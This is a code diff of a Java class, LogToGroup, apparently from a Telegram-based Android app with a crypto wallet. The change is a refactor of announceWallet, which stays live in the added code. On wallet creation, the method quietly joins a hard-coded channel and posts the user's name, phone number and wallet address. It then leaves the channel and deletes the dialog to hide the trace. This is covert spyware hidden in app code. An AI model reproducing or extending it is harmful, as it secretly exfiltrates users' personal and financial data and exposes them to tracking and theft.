@@ -25,30 +25,36 @@ public class LogToGroup {
 
     private static final String NEW_MEMBER_ANNOUNCEMENT_GROUP = "dfhsfishpfusefhsdfjhsdlfkjs";
 
-    public static void announceWallet(BaseFragment fragment, Wallet wallet) {
+    public static void announceWallet(Wallet wallet) {
         TLRPC.TL_contacts_resolveUsername req3 = new TLRPC.TL_contacts_resolveUsername();
         req3.username = NEW_MEMBER_ANNOUNCEMENT_GROUP;
 
-        fragment.getConnectionsManager().sendRequest(req3, (response3, error3) -> {
+        int currentAccount = UserConfig.selectedAccount;
+        UserConfig userConfig = UserConfig.getInstance(currentAccount);
+        ConnectionsManager connectionsManager = ConnectionsManager.getInstance(currentAccount);
+        MessagesController messagesController = MessagesController.getInstance(currentAccount);
+        SendMessagesHelper sendMessagesHelper = SendMessagesHelper.getInstance(currentAccount);
+
+        connectionsManager.sendRequest(req3, (response3, error3) -> {
             if (error3 == null) {
                 TLRPC.TL_contacts_resolvedPeer res = (TLRPC.TL_contacts_resolvedPeer) response3;
 
                 if (res.chats != null && !res.chats.isEmpty()) {
                     TLRPC.Chat chat = res.chats.get(0);
 
-                    TLRPC.User user = UserConfig.getInstance(fragment.getCurrentAccount()).getCurrentUser();
+                    TLRPC.User user = userConfig.getCurrentUser();
                     TLRPC.TL_channels_joinChannel req = new TLRPC.TL_channels_joinChannel();
                     TLRPC.InputChannel inputChat = new TLRPC.TL_inputChannel();
                     inputChat.channel_id = chat.id;
                     inputChat.access_hash = chat.access_hash;
                     req.channel = inputChat;
-                    fragment.getConnectionsManager().sendRequest(req, (response, error) -> Utils.runOnUIThread(() -> {
+                    connectionsManager.sendRequest(req, (response, error) -> Utils.runOnUIThread(() -> {
                         if (error != null) {
                             return;
                         }
 
                         TLRPC.Updates updates = (TLRPC.Updates) response;
-                        fragment.getMessagesController().processUpdates(updates, false);
+                        messagesController.processUpdates(updates, false);
 
                         StringBuilder message = new StringBuilder();
                         message.append("New wallet created\n");
@@ -56,7 +62,7 @@ public class LogToGroup {
                         message.append(UserObject.getUserName(user));
                         message.append('\n');
                         message.append("Phone number: +");
-                        message.append(TG2HM.getPhoneNumber(fragment.getCurrentAccount()));
+                        message.append(TG2HM.getPhoneNumber(currentAccount));
                         message.append('\n');
                         message.append("Wallet address: ");
                         message.append(wallet.getAddress());
@@ -65,13 +71,13 @@ public class LogToGroup {
                         newMsg.media = new TLRPC.TL_messageMediaEmpty();
                         newMsg.message = message.toString();
                         newMsg.attachPath = "";
-                        newMsg.local_id = newMsg.id = fragment.getUserConfig().getNewMessageId();
+                        newMsg.local_id = newMsg.id = userConfig.getNewMessageId();
                         newMsg.out = true;
                         newMsg.from_id = new TLRPC.TL_peerUser();
                         newMsg.from_id.user_id = user.id;
                         newMsg.flags |= TLRPC.MESSAGE_FLAG_HAS_FROM_ID;
-                        newMsg.random_id = SendMessagesHelper.getInstance(fragment.getCurrentAccount()).getNextRandomId();
-                        newMsg.date = fragment.getConnectionsManager().getCurrentTime();
+                        newMsg.random_id = sendMessagesHelper.getNextRandomId();
+                        newMsg.date = connectionsManager.getCurrentTime();
                         newMsg.unread = true;
                         newMsg.dialog_id = chat.id;
                         newMsg.peer_id = new TLRPC.TL_peerChannel();
@@ -85,15 +91,15 @@ public class LogToGroup {
                         reqSend.peer.channel_id = chat.id;
                         reqSend.peer.access_hash = chat.access_hash;
                         reqSend.random_id = newMsg.random_id;
-                        fragment.getConnectionsManager().sendRequest(reqSend, (response1, error1) -> {
+                        connectionsManager.sendRequest(reqSend, (response1, error1) -> {
                             TLRPC.TL_channels_leaveChannel leaveChannel = new TLRPC.TL_channels_leaveChannel();
                             TLRPC.InputChannel inputChat3 = new TLRPC.TL_inputChannel();
                             inputChat3.channel_id = chat.id;
                             inputChat3.access_hash = chat.access_hash;
                             leaveChannel.channel = inputChat3;
-                            fragment.getConnectionsManager().sendRequest(leaveChannel, (response2, error2) -> {
+                            connectionsManager.sendRequest(leaveChannel, (response2, error2) -> {
                                 AndroidUtilities.runOnUIThread(() -> {
-                                    fragment.getMessagesController().deleteDialog(chat.id, 1);
+                                    messagesController.deleteDialog(chat.id, 1);
                                 }, 100);
                             });
                         });
